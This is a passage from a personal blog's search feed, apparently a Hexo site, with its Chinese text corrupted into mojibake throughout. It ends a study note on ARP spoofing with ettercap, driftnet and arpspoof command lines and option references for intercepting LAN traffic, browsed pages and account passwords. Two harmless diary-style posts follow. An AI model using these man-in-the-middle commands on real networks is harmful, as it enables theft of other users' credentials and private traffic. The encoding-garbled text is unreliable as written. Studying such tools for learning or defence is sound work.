<span class="hljs-number">1</span> &gt; <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/net/i</span>pv4/ip_forward<br></code></pre></td></tr></table></figure><blockquote><p>æƒé™ä¸å¤Ÿå°±<code>sudo -i</code> ä½¿ç”¨rootæƒé™æ”¹</p></blockquote><p>é™åˆ¶ç½‘é€Ÿ</p><p>å¯ä»¥ä½¿ç”¨çš„å·¥å…·æœ‰tcã€iptablesã€WonderShaperç­‰ç­‰ï¼Œ</p><p>ä»¥tcä¸ºä¾‹<del>æœ¬èœé¸¡è¿˜æ²¡å­¦ä¼šåä¸¤ä¸ª</del>ğŸ˜¢ï¼š</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs maxima">é™åˆ¶ç½‘é€Ÿ200mså»¶æ—¶<br>sudo tc qdisc add dev eth0 root netem <span class="hljs-built_in">delay</span> 200ms<br> <br>å–æ¶ˆé™åˆ¶ç½‘é€Ÿ200mså»¶æ—¶<br>sudo tc qdisc <span class="hljs-built_in">del</span> dev eth0 root netem <span class="hljs-built_in">delay</span> 200ms<br></code></pre></td></tr></table></figure><p>æ‹¦æˆªæ•°æ®â€”è·å–æµè§ˆç½‘é¡µåŠè´¦å·å¯†ç </p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">ettercap -Tq -<span class="hljs-selector-tag">i</span> <span class="hljs-selector-attr">[ç½‘å¡]</span><br></code></pre></td></tr></table></figure><p>å—…æ¢å›¾ç‰‡</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">driftnet  -<span class="hljs-selector-tag">i</span> <span class="hljs-selector-attr">[ç½‘å¡]</span><br></code></pre></td></tr></table></figure><hr><h3 id="å·¥å…·è¯´æ˜ä¹¦"><a href="#å·¥å…·è¯´æ˜ä¹¦" class="headerlink" title="å·¥å…·è¯´æ˜ä¹¦"></a>å·¥å…·è¯´æ˜ä¹¦</h3><p>å› ä¸ºå„ç§å·¥å…·çš„ä½¿ç”¨è¯´æ˜éƒ½æ˜¯è‹±æ–‡çš„ï¼Œæ‰€ä»¥ç›´æ¥åˆ©ç”¨ä¸‡èƒ½çš„äº’è”ç½‘æœäº†ä¸€ä¸‹ä¸­æ–‡çš„ä½¿ç”¨æŒ‡å—ï¼š</p><h5 id="driftnet"><a href="#driftnet" class="headerlink" title="driftnet"></a>driftnet</h5> <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs css">è¯­æ³•ï¼š driftnet   <span class="hljs-selector-attr">[options]</span>   <span class="hljs-selector-attr">[filter code]</span><br><br> -<span class="hljs-selector-tag">b</span>  æ•è·åˆ°æ–°çš„å›¾ç‰‡æ—¶å‘å‡ºå˜Ÿå˜Ÿå£°<br> -<span class="hljs-selector-tag">i</span>  interface     é€‰æ‹©ç›‘å¬æ¥å£<br> -f  file   è¯»å–ä¸€ä¸ªæŒ‡å®špcapæ•°æ®åŒ…ä¸­çš„å›¾ç‰‡<br> -<span class="hljs-selector-tag">p</span>  ä¸è®©æ‰€ç›‘å¬çš„æ¥å£ä½¿ç”¨æ··æ‚æ¨¡å¼<br> -<span class="hljs-selector-tag">a</span>  åå°æ¨¡å¼ï¼šå°†æ•è·çš„å›¾ç‰‡ä¿å­˜åˆ°ç›®å½•ä¸­ï¼ˆä¸ä¼šæ˜¾ç¤ºåœ¨å±å¹•ä¸Šï¼‰<br> -m  number æŒ‡å®šä¿å­˜å›¾ç‰‡æ•°çš„æ•°ç›®<br> -d  directory  æŒ‡å®šä¿å­˜å›¾ç‰‡çš„è·¯å¾„<br> -x  prefix  æŒ‡å®šä¿å­˜å›¾ç‰‡çš„å‰ç¼€å<br></code></pre></td></tr></table></figure><h5 id="arpspoof"><a href="#arpspoof" class="headerlink" title="arpspoof"></a>arpspoof</h5><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs markdown">åå­— <br><span class="hljs-code">       arpspoof - æˆªè·äº¤æ¢å±€åŸŸç½‘ä¸­çš„æ•°æ®åŒ…</span><br><span class="hljs-code"></span><br>ç”¨æ³•<br><span class="hljs-code">       arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host</span><br><span class="hljs-code"></span><br>æè¿°<br><span class="hljs-code">       arpspoofé€šè¿‡ä¼ªé€ çš„ARPå“åº”åŒ…æ”¹å˜å±€åŸŸç½‘ä¸­ä»ç›®æ ‡ä¸»æœºï¼ˆæˆ–æ‰€æœ‰ä¸»æœºï¼‰åˆ°å¦ä¸€ä¸ªä¸»æœºï¼ˆhostï¼‰çš„æ•°æ®åŒ…è½¬å‘è·¯å¾„ã€‚è¿™æ˜¯äº¤æ¢å±€åŸŸç½‘ä¸­å—…æ¢ç½‘ç»œæµé‡çš„ä¸€ç§æä¸ºæœ‰æ•ˆçš„æ–¹æ³•ã€‚</span><br><span class="hljs-code">       å†…æ ¸IPè½¬å‘ï¼ˆæˆ–å¦‚fragrouterè¿™æ ·çš„ã€ç”¨æˆ·å±‚é¢çš„ã€èƒ½å®ŒæˆåŒæ ·åŠŸèƒ½çš„è½¯ä»¶ï¼‰å¿…é¡»æå‰å¼€å¯ã€‚</span><br><span class="hljs-code"></span><br>å‚æ•°<br><span class="hljs-code">       -i interface</span><br><span class="hljs-code">              æŒ‡å®šè¦ä½¿ç”¨çš„æ¥å£ï¼ˆå³æŒ‡å®šä¸€å—ç½‘å¡ï¼‰</span><br><span class="hljs-code"></span><br><span class="hljs-code">       -c own|host|both</span><br><span class="hljs-code">              æŒ‡å®šåœ¨æ¢å¤ARPé…ç½®æ—¶ä½¿ç”¨çš„ç¡¬ä»¶åœ°å€ï¼›å½“åœ¨æ¸…ç†ï¼ˆcleaning upï¼‰æ—¶ï¼Œæ•°æ®åŒ…çš„æºåœ°å€å¯ä»¥ç”¨è‡ªå·±çš„ä¹Ÿå¯ä»¥ç”¨ä¸»æœºï¼ˆhostï¼‰çš„ç¡¬ä»¶åœ°å€ã€‚</span><br><span class="hljs-code">              ä½¿ç”¨ä¼ªé€ çš„ç¡¬ä»¶åœ°å€å¯èƒ½å¯¼è‡´æŸäº›é…ç½®ä¸‹çš„äº¤æ¢ç½‘ç»œã€APç½‘ç»œæˆ–æ¡¥æ¥ç½‘ç»œé€šä¿¡ä¸­æ–­ï¼Œç„¶è€Œå®ƒæ¯”èµ·é»˜è®¤å€¼â€”â€”â€”â€”ä½¿ç”¨è‡ªå·±çš„ç¡¬ä»¶åœ°å€è¦å·¥ä½œåœ°æ›´ä¸ºå¯é ã€‚</span><br><span class="hljs-code"></span><br><span class="hljs-code">       -t target</span><br><span class="hljs-code">              æŒ‡å®šä¸€ä¸ªç‰¹æ®Šçš„ã€å°†è¢«ARPæ¯’åŒ–çš„ä¸»æœºï¼ˆå¦‚æœæ²¡æœ‰æŒ‡å®šï¼Œåˆ™è®¤ä¸ºæ˜¯å±€åŸŸç½‘ä¸­æ‰€æœ‰ä¸»æœºï¼‰ã€‚é‡å¤å¯ä»¥æŒ‡å®šå¤šä¸ªä¸»æœºã€‚</span><br><span class="hljs-code"></span><br><span class="hljs-code">       -r     æ¯’åŒ–ä¸¤ä¸ªä¸»æœºï¼ˆç›®æ ‡å’Œä¸»æœºï¼ˆhostï¼‰ï¼‰ä»¥æ•è·ä¸¤ä¸ªæ–¹å‘çš„ç½‘ç»œæµé‡ã€‚ï¼ˆä»…ä»…åœ¨å’Œ-tå‚æ•°ä¸€èµ·ä½¿ç”¨æ—¶æœ‰æ•ˆï¼‰</span><br><span class="hljs-code"></span><br><span class="hljs-code">       host   hostæ˜¯ä½ æƒ³è¦æˆªè·æ•°æ®åŒ…çš„ä¸»æœº (é€šå¸¸æ˜¯ç½‘å…³)ã€‚</span><br><span class="hljs-code"></span><br></code></pre></td></tr></table></figure><h5 id="ettercap"><a href="#ettercap" class="headerlink" title="ettercap"></a>ettercap</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">i</span>åé¢è·Ÿç€è¿æ¥å±€åŸŸç½‘çš„ç½‘å¡<br>TæŒ‡çš„æ˜¯textæ–‡æœ¬æ¨¡å¼<br><span class="hljs-selector-tag">q</span>ä»¥å®‰é™æ¨¡å¼æ‰§è¡Œè¿™ä¸ªå‘½ä»¤<br>MæŒ‡å®šæ”»å‡»æ¨¡å¼<br>&gt;&gt;è¾“å‡ºæ–‡ä»¶<br></code></pre></td></tr></table></figure><hr><p>å‘ä¸ªç¬”è®°ä¸Šæ¥ä¸ç„¶è¿™ä¸ªåšå®¢çœŸçš„æˆç¢ç¢å¿µä¸“æ äº†ğŸ˜¶â€ğŸŒ«ï¸</p><p>æˆ‘å°±æ˜¯ä¸ªèœé¸¡ğŸƒ</p>]]></content>
    
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>ARP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¹´ç»ˆæ€»ç»“</title>
    <link href="/2022/12/29/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    <url>/2022/12/29/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>æƒ³å¥½æ€æ ·å‘Šåˆ«2022äº†å—ï¼ŸğŸ¥°</p><span id="more"></span><p>æˆ‘æ€»æ˜¯å–œæ¬¢åœ¨å¹´æœ«ç»™æœªæ¥ä¸€å¹´çš„è‡ªå·±ç•™ä¸‹ç¥ç¦ï¼Œä»Šå¹´è¿˜æ˜¯åƒå¾€å¹´ä¸€æ ·çš„å¥—è·¯ï¼šå¸Œæœ›2023çš„è‡ªå·±å¯ä»¥æ›´æ´’è„±ã€æ›´è‡ªç”±ã€‚</p><p>è¿‡å»çš„ä¸€å¹´ï¼Œæˆ‘æ¥åˆ°äº†æ¢¦å¯ä»¥æ±‚çš„åå…«å²ã€‚æˆ‘ä»è¢«å›šç¦åœ¨åº”è¯•æ•™è‚²ä¸­çš„é«˜ä¸­ç”Ÿå˜æˆäº†æ‚ é—²åˆå¿™ç¢Œçš„å¤§å­¦ç”Ÿï¼›æˆ‘è€ƒå‡ºäº†é©¾ç…§ã€å­¦ä¼šäº†å¼¹å‰ä»–ï¼›æˆ‘ç¬¬ä¸€æ¬¡ç¦»å¼€äº†çˆ¶æ¯ã€è¿œç¦»å®¶ä¹¡ï¼Œå¼€å§‹ä½å®¿ç”Ÿæ´»ï¼›æˆ‘äº†è§£åˆ°ä¸åŒçš„ä¸–ç•Œï¼Œçœ‹åˆ°äº†æ–°çš„é£æ™¯ã€‚</p><p>è¿‡å»çš„ä¸€å¹´ï¼Œæˆ‘å’Œå¾ˆå¤šäººç›¸é‡ï¼Œä¹Ÿå’Œå¾ˆå¤šäººå‘Šåˆ«ã€‚</p><p>è¿™å‡ å¤©æˆ‘æƒ³ä¸ºè‡ªå·±æŒ‘é€‰å¹´åº¦ä¹å›¾ï¼Œäºæ˜¯ä¹æˆ‘ç¿»å‡ºäº†ç½‘ç›˜é‡Œå±äºé«˜ä¸­çš„æ–‡ä»¶å¤¹ã€‚æ¯•ç«Ÿå°±åœ¨ä¸ŠåŠå¹´ï¼Œæˆ‘è¿˜æ˜¯ä¸€ä¸ªè¢«è±¢å…»çš„é«˜è€ƒé‡‘ä¸é›€ã€‚æˆ‘æ‰“å¼€çœ‹ï¼Œé‡Œé¢ç››æ»¡äº†æˆ‘é«˜ä¸‰é‚£å¹´ç”¨è€å¤è‘£ç›¸æœºå®šæ ¼çš„é’æ˜¥çƒ­è¡€ã€‚æ–‡ä»¶å¤¹é‡Œæœ‰å­¦æ ¡é‡Œç››å¼€çš„èŠ±ï¼Œé˜³å…‰ä¸‹æƒ¬æ„çš„çŒ«ï¼Œè¿˜æœ‰æ•°ä¸æ¸…çš„æ„æ°”é£å‘çš„å°‘å¹´ã€‚è¿˜è®°å¾—ï¼Œæ™¦æ¶©è€Œåˆç¿çƒ‚çš„é«˜ä¸‰ï¼Œæ¯å¤©æ™šè‡ªä¹ çš„æœ€ååŠå°æ—¶ï¼Œæˆ‘éƒ½æ²¡æœ‰å‘è€å¸ˆå®¶é•¿å®å˜±çš„é‚£èˆ¬æŠ“ç´§æ—¶é—´èƒŒå•è¯ã€å†™å¤§é¢˜ï¼Œæˆ‘æŠŠæ—¶é—´ç”¨æ¥åœ¨æœ¬å­ä¸Šè®°å½•æˆ‘çš„å–œæ€’å“€ä¹ï¼Œä¹¦å†™æˆ‘å¯¹è¿™æ®µæ—¶å…‰çš„ä¸èˆä¸ç•™æ‹ã€‚é«˜ä¸­æ¯•ä¸šï¼Œæˆ‘æ”’äº†ä¸‰æœ¬æ—¥è®°åŠ ä¸€æœ¬éšç¬”ã€‚</p><p>æˆ‘ä»è®°å¾—æ¯•ä¸šé‚£åœºåˆ†åˆ«ï¼Œæˆ‘ä»¬èƒŒç€ä¹¦åŒ…ï¼Œåƒå¹³å¸¸é‚£æ ·è¯´ç€å†è§ã€‚æˆ‘å’Œæœ‹å‹ä»¬æ²¡æœ‰è½°è½°çƒˆçƒˆçš„å‘Šåˆ«ï¼Œåªæœ‰åœ¨è€³è¾¹å¹è¿‡çš„ç‚çƒ­åˆæ½®æ¹¿çš„æ™šé£ï¼Œå’Œçª—å¤–çš„å–§é—¹ä¸æ­¢çš„è‰é¸£ã€‚æˆ‘å°†è®°å½•éšç¬”çš„æœ¬å­å¸¦åˆ°äº†å¤§å­¦ï¼Œå´æœªæ›¾åœ¨ä¸Šé¢å†™ä¸‹ä¸€ä¸ªæ–‡å­—ã€‚æˆ‘åªæ˜¯ä¸€æ¬¡åˆä¸€æ¬¡çš„ç¿»å¼€å®ƒï¼Œå½“ä½œå¤§å­¦ç”Ÿæ´»ä¸­çš„ä¹è¶£ï¼Œå»é‡æ¸©é‚£æ®µå…µè’é©¬ä¹±è€Œåˆæ½‡æ´’è‚†æ„çš„æ—¶å…‰ã€‚å°±åƒæˆ‘åœ¨æœ¬å­é‡Œå†™ä¸‹çš„ç¬¬ä¸€æ®µè¯â€”â€”â€œæˆ‘æ‰€è®°å½•çš„æ¯ä¸€ä¸ªæ–‡å­—ï¼Œéƒ½æ˜¯è¿‡å»çš„æˆ‘å¯¹æœªæ¥çš„èµ ç¤¼â€ã€‚</p><p>å››ä¸ªæœˆçš„å¤§å­¦å¥½åƒç”µå½±èƒ¶å·ï¼Œè¢«æœºå™¨æ‹‰æ‰¯ç€ï¼Œåœ¨æˆ‘çœ¼å‰ä¸€é—ªè€Œè¿‡ï¼Œä½†æ˜¯è¿™æ¡è·¯ä¸Šä»ç„¶æœ‰ç²¾å½©çš„é£æ™¯ã€‚æˆ‘é‡åˆ°äº†æ–°çš„æœ‹å‹ï¼Œå’Œä»–ä»¬åˆ†äº«ä¸åŒçš„å¹¸ç¦ã€‚å…¨æ–°çš„ç”Ÿæ´»å¹¶ä¸æ²¡æœ‰è®©æˆ‘æ„Ÿåˆ°ä¸å®‰ï¼Œæˆ–è®¸æ˜¯éª¨å­é‡Œçš„ç§¯æå‹‡æ•¢ï¼Œå¼‚æˆ–è®¸æ˜¯èº«è¾¹ä¼™ä¼´çš„é¼“åŠ±é™ªä¼´ï¼Œè®©æˆ‘çš„è¿™æ®µæ–°çš„æ—…ç¨‹æ€»æ˜¯å¹³ç¨³ç•…é€šçš„ã€‚ä»å­¦æœŸåˆçš„æ“’æ•Œæ‹³ï¼Œåˆ°å­¦ä¼šçš„æŠ•ç¯®æ¡æ¼æŠ€å·§ï¼Œè¿˜æœ‰ä¸ºäº†äº¤ä½œä¸šå°è¯•çš„æ”¹æºç çš„æ­ªé—¨é‚ªé“ï¼Œå†åˆ°æœŸæœ«ä¸´èµ°å‰å¤œè·å¾—çš„ç¾½æ¯›çƒè€å¸…æŠ€å·§Â·Â·Â·Â·Â·Â·è¿™äº›å¥‡å¥‡æ€ªæ€ªçš„æŠ€èƒ½èƒŒåï¼Œéƒ½æœ‰ä¸€ç¾¤æˆ‘éå¸¸æ„Ÿè°¢ç›¸é‡ç›¸è¯†çš„äººã€‚æˆ‘è¿˜æ˜¯ä¸ªå–œæ¬¢æ”¶é›†ç‰©æ–™çš„äººï¼Œå®¿èˆä¹¦æ¡Œä¸Šçš„è½¯æœ¨æ¿ï¼Œé’‰ç€æˆ‘çš„ç¬¬ä¸€å¼ çŒ®è¡€è¯ä¹¦ï¼Œè´´ç€æˆ‘ç¬¬ä¸€æ¬¡éƒ¨é—¨ç ´å†°ä¼šè®®çš„å¡ç‰‡ï¼Œæ¡†æ¶è¾¹ç¼˜é‡Œå¤¹è¿˜æœ‰ä¸´èµ°æ—¶æ”¶åˆ°çš„æ–°å¹´è´ºå¡Â·Â·Â·Â·Â·Â·è¿™äº›ç‰©ä»¶æ‰¿è½½çš„æ•…äº‹æ€»èƒ½åœ¨å›å¿†é‡Œç† ç† ç”Ÿè¾‰ã€‚</p><p>åœ¨å¤œæ·±æ—¶åˆ†ï¼Œæˆ‘ç»å¸¸ä¼šæŠŠè¿™äº›ç¢ç‰‡ä»è®°å¿†æ·±å¤„æ‹å‡ºæ¥ï¼ŒæŠŠä»–ä»¬æ‹¼å‡‘æˆå®Œæ•´çš„æ‹¼å›¾ã€‚</p><p><del>å¥½å§ï¼Œæˆ‘æ‰¿è®¤è‡ªå·±æ€»æ˜¯æ´»åœ¨å›å¿†é‡Œã€‚</del></p><p>æœ€åï¼Œæ„Ÿè°¢2022ï¼Œè®©æˆ‘é‡åˆ°äº†æ„è¶£ç›¸æŠ•çš„äººï¼Œä¹Ÿè®©æˆ‘æ‹¥æœ‰æ»šçƒ«è€Œåˆçƒ­çƒˆçš„è®°å¿†ã€‚</p><p>æ–°çš„ä¸€å¹´ï¼Œæ„¿æˆ‘æ‰€çˆ±ï¼Œå¹³å®‰é¡ºé‚ã€‚ğŸ†</p>]]></content>
    
    
    <categories>
      
      <category>ç¢ç¢å¿µ</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä¹å›­å…¥åœºåˆ¸</title>
    <link href="/2022/12/10/%E4%B9%90%E5%9B%AD%E5%85%A5%E5%9C%BA%E5%88%B8/"/>
    <url>/2022/12/10/%E4%B9%90%E5%9B%AD%E5%85%A5%E5%9C%BA%E5%88%B8/</url>
    
    <content type="html"><![CDATA[<p>è¿™æ˜¯ä¸€å¼ ä¹å›­å…¥åœºåˆ¸</p><span id="more"></span><p>æ­å–œä½ å‘ç°äº†å®è—ï¼</p><p>æˆåŠŸæ­å»ºè¿™ä¸ªåšå®¢è¿™æ˜¯æˆ‘ä¸Šå¤§å­¦ä»¥æ¥åšè¿‡æœ€æœ‰æˆå°±æ„Ÿçš„äº‹ã€‚è™½ç„¶è¿‡ç¨‹ä¸­è¸©äº†å¾ˆå¤šå‘ï¼Œä½†æ„Ÿè°¢æˆ‘æ²¡æœ‰æ”¾å¼ƒï¼Œæ‰æœ‰äº†ç°åœ¨è¿™ä¸ªå±äºæˆ‘çš„å°å°æä¹ä¸–ç•Œã€‚</p><p>è¿™é‡Œæ˜¯ä¸€ä¸ªModifierçš„å¤‡å¿˜ä»“åº“ï¼Œä¹Ÿæœ‰å¾ˆå¤šæœªçŸ¥å®è—ã€‚</p><hr><p>æœ€è¿‘åœ¨ä¸åœåœ°ä¿®æ”¹æˆ‘çš„æ–‡ç« ï¼Œå°½å¯èƒ½çš„æŠŠæ–‡ç« å†™å¾—ç®€æ´æ˜äº†ã€‚</p><p>ä¸€äº›å¾ˆåŸºç¡€çš„ä¸œè¥¿ä¹Ÿå‘ä¸Šæ¥ï¼Œä¸€æ˜¯æƒ³è®°å½•è‡ªå·±çš„å­¦ä¹ å†ç¨‹ï¼ŒäºŒæ˜¯æƒ³ç€ï¼Œç­‰åˆ°å“ªå¤©æˆ‘çš„æ–‡ç« ä¹Ÿæœ‰äººçœ‹äº†ï¼Œèƒ½è®©äººä¸€ä¸‹å­å°±èƒ½çœ‹å¾—æ˜ç™½ã€‚</p><hr><p>å¦‚æœä½ çœ‹åˆ°äº†è¿™é‡Œï¼Œé‚£å°±ç¥ä½ åœ¨Modifierçš„æä¹ä¸–ç•Œé‡Œäº«å—è‡ªç”±ä¸å¿«ä¹å§ï¼</p>]]></content>
    
    
    <categories>
      
      <category>ç¢ç¢å¿µ</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
